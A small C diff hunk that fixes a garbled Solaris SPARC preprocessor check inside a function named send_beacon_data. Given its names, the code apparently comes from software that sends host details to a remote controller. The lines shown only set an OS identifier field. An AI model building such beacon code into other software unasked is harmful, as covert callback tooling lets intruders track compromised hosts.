@@ -332,7 +332,7 @@ static int send_beacon_data(BEACONINFO* beaconInfo, unsigned long uptime, int ne
 	#endif
 
 #elif defined SOLARIS
-	#if defined _SPARCBZ2_bzCompressInit
+	#if defined _SPARC
 		bhdr.os = htons(BH_SOLARIS_SPARC);
 	#elif defined _X86
 		bhdr.os = htons(BH_SOLARIS_X86);
